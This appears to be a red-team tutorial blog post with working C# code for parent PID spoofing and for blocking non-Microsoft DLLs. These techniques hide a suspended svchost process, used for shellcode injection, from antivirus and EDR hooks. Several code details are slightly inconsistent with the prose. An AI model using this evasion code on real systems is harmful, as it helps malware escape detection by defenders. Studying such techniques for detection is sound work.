---
title: "Staying Under the Radar - Part 1 - PPID Spoofing and Blocking DLLs"
author:
  name: crypt0ace
  link: https://twitter.com/crypt0acee
date: 2022-09-18
description: "Spoofing parent PID and blocking non Microsoft DLLs in C#"
tags: [Red Team]
---
## Introduction
In this post we are going to look at two "features" (lol) that Microsoft provided which can allow us to spoof our parent process ID and also block third party DLLs that are not Microsoft signed. These DLLs can be EDR DLLs that add hooks in our not so safe tools.

## PPID Spoofing
PPID Spoofing or Parent Process ID Spoofing is a technique adversaries use to evade detections based on parent-child relationships. This method makes the process look like its being spawned under a different parent process than actual parent proces.

## Blocking DLLS
Blocking third party DLLs is another method used by attackers. This method allows the attacker to specify that any non Microsoft DLL can not inject into a process. This can help evade some AVs/EDRs that rely on hooking into processes.

## UpdateProcThreadAttribute
The API that allows us to do it is `UpdateProcThreadAttribute`. Basically `InitializeProcThreadAttributeList` and `UpdateProcThreadAttribute`. The first one allows us to initialize the attributes we need and then we can update or push them using the second one. It'll make more sense soon.
<br>
I'm using the same Process Injection from [here](https://crypt0ace.github.io/posts/Shellcode-Injection-Techniques-Part-3/) in this. Most of the code and imports are the same so I'm not going to talk about them again. Please read the previous post or look at the code to understand that part.

### Imports
First we need to add the imports we need. The new APIs we need from the already present one in the EarlyBird POC are the ones mentioned below. The `CreateProcess` is the same with one difference. Instead of `STARTUPINFO` struct we are going to use `STARTUOINFOEX` struct. This is used to specify the attributes we are going to use with `CreateProcess`. We are going to use `OpenProcess` to get a process handle for the parent process we are specifying. Next we are going to use `InitializeProcThreadAttributeList` to initialize the attributes that we need. And then update them using `UpdateProcThreadAttribute`. 
```csharp
[DllImport("kernel32.dll")]
public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFOEX lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);

[DllImport("kernel32.dll")]
public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

[DllImport("kernel32.dll")]
public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

[DllImport("kernel32.dll")]
public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
```

We also need the `STARTUOINFOEX` struct and some other constant values. These are taken from PInvoke website. The constants are from the Microsoft Docs.
```csharp
// https://pinvoke.net/default.aspx/Structures/STARTUPINFOEX.html
[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
public struct STARTUPINFOEX
{
  public STARTUPINFO StartupInfo;
  public IntPtr lpAttributeList;
}

// https://pinvoke.net/default.aspx/kernel32/OpenProcess.html
[Flags]
public enum ProcessAccessFlags : uint
{
  All = 0x001F0FFF,
  CreateProcess = 0x000000080
}

public const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
public const long PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;
public const int PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007;

public static class CreationFlags
{
  public const uint SUSPENDED = 0x4;
  public const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
}
```

All the remaining ones like `PROCESS_INFORMATION` etc. are going to be the same.

### Main Method
First up we need to initialize the `STARTUOINFOEX` and `PROCESS_INFORMATION` structs.
```csharp
STARTUPINFOEX siex = new STARTUPINFOEX();
PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
```

Then we can look for the target parent process whose ID we are going to give to our malicious program. I'm using explorer but you can use whatever process you want. Make sure that process is already running.
```csharp
var process = Process.GetProcessesByName("explorer");
int parentProc = 0;
foreach (var p in process)
{
  parentProc += p.Id;
}

Console.WriteLine("[*] New Parent PID Found: {0}", parentProc);
```

After we successfully get our parent PID, we can use `OpenProcess` to get a handle to it.
```csharp
IntPtr procHandle = OpenProcess(ProcessAccessFlags.CreateProcess, false, parentProc);
```

Now we can use `InitializeProcThreadAttributeList` to initialize the specified list of attributes for process and thread creation. We need to specify `dwAttributeCount` as 2. One for parent process ID and the other to specify mitigation policy. The other thing we need is the `lpAttributeList`. As the docs on Microsoft say, this parameter can be null to determine the buffer size required to support the specified number of attributes. We are going to determine to buffer size using `Marshal.AllocHGlobal` and providing it `IntPtr.Size` which is 8 for x64 process and 4 for x86 process. As we are targeting x64 specifically this would be 8. We are going to provide this value to `STARTUOINFOEX.lpAttributeList` struct. And then use the same `InitializeProcThreadAttributeList` call.
```csharp
IntPtr lpSize = IntPtr.Zero;
InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);

siex.lpAttributeList = Marshal.AllocHGlobal(IntPtr.Size);
InitializeProcThreadAttributeList(siex.lpAttributeList, 2, 0, ref lpSize);
```

Similarly, we can do this with `lpValueProc` which we need to give to `UpdateProcThreadAttribute`. We also need to use `Marshal.WriteIntPtr` to write the parent process handle to `lpValueProc`. This will give us a pointer to the attribute value which we can use.
<br>
Now we can use `UpdateProcThreadAttribute` with providing the attribute list from `STARTUOINFOEX`, the `dwFlags` is reserved so its going to be zero. Then we are going to provide our attribute that we want to update. First its going to be `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` whose value we already have added in our imports. Next we can provide the pointer to attribute value. The `cbSize` is going to be the size that was specified in the `lpValueProc`, `IntPtr.Size` which would be 8. THe other two are reserved and need to be null.
```csharp
IntPtr lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
Marshal.WriteIntPtr(lpValueProc, procHandle);
UpdateProcThreadAttribute(siex.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpValueProc, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
```

Once that is done, our PPID Spoofing should work. We can use the same process for blocking non Microsoft DLLs as well. The attribute is going to be `PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY` and the value `lpMitigationPolicy` we are providing would be `PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON` which specifies that only Microsoft signed DLLs should be injected in the process.
```csharp
IntPtr lpMitigationPolicy = Marshal.AllocHGlobal(IntPtr.Size);
Marshal.WriteInt64(lpMitigationPolicy, PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON);
UpdateProcThreadAttribute(siex.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, lpMitigationPolicy, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
```

If that works, when you use `CreateProcess` to create a process, it should have the parent process ID as the one we specified and the mitigation policy should also be applied. The only change that is needed is that with the suspended flag like we have in our process injection we also need to specify `EXTENDED_STARTUPINFO_PRESENT` and the reference that used to be to `STARTUPINFO` is now going to be `STARTUOINFOEX` which we specified as `siex`. I added a `Console.ReadKey()` which would pause the process so we can check if the attributes work. We also need to add the rest of the code from the process injection after this.
```csharp
string app = @"C:\Windows\System32\svchost.exe";
bool procinit = CreateProcess(app, null, IntPtr.Zero, IntPtr.Zero, false, CreationFlags.SUSPENDED | CreationFlags.EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref siex, ref pi);
Console.WriteLine("[*] Process Created. Process ID: {0}", pi.dwProcessId);
Console.ReadKey();
```

We can first check a normal program to see if attributes are present or if the AV DLL is injected or not. For this demo I'm using BitDefender's free version and I'm using Process Hacker 2 to check the process.
<br>
![Notepad attributes](/assets/img/staying-under-the-radar/notepad_attributes.png)
<br>
![Notepad DLLs](/assets/img/staying-under-the-radar/notepad_dlls.png)
<br>
We can see that the process is a child process of explorer which is normal. We can also see that there is not mitigation policy which is why the `atcuf64.dll` DLL by BitDefender is injected into the process.
<br>
![svchost attributes](/assets/img/staying-under-the-radar/svchost_attributes.png)
<br>
![svchost DLLs](/assets/img/staying-under-the-radar/svchost_dlls.png)
<br>
But when we use our tool which starts `svchost` as a suspended process, we can see that it appears to be a child process of notepad which it definitely is not. We can also see the mitigation policy that mentions Microsoft Only, using which we have no BitDefender injected DLLs.

## Code
The full code can be found on my github [here](https://github.com/crypt0ace/PPIDSpoof). There are still a few changes and features I want to add in it but it still works. Make sure to compile it for x64.

## Conslusion
Its a nice trick to confuse defenders but I should mention, AVs and EDRs are smart now so this probably will not be enough for you to get past. It did get flagged as malicious by BitDefender as well. There's a lot of other things we can do to make sure it works which would be discussed later.

## References
Credits to all of these posts and publicaly available tools

- [Preventing 3rd Party DLLs from Injecting into your Malware - IRed.Team](https://www.ired.team/offensive-security/defense-evasion/preventing-3rd-party-dlls-from-injecting-into-your-processes)
- [D/Invokify PPID Spoofy & BlockDLLs - RastaMouse](https://offensivedefence.co.uk/posts/ppidspoof-blockdlls-dinvoke/)
- [Parent PID Spoofing](https://pentestlab.blog/2020/02/24/parent-pid-spoofing/)
- [Covenant Task 101 - PPID Spoof Example](http://secureallofus.blogspot.com/2020/03/covenant-task-101-ppid-spoof-example.html)
- [Less Detectable with PPID Spoofing](https://rioasmara.com/2022/04/16/less-detectable-with-ppid-spoofing/)
- [PPID Spoof & BlockDLLs - RastaMouse](https://gist.github.com/rasta-mouse/af009f49229c856dc26e3a243db185ec)
- [ProcessInjection - 3xpl01tc0d3r](https://github.com/3xpl01tc0d3r/ProcessInjection/blob/master/ProcessInjection/PInvoke/PPIDSpoofing.cs)
- [Alternative methods of becoming SYSTEM - XPN](https://blog.xpnsec.com/becoming-system/)
- [CSharp - leoloobeek](https://github.com/leoloobeek/csharp/blob/master/ExecutionTesting.cs)
- [Defcon27 CSharp Workshop -  mvelazc0](https://github.com/mvelazc0/defcon27_csharp_workshop/blob/master/Labs/lab8/1.cs)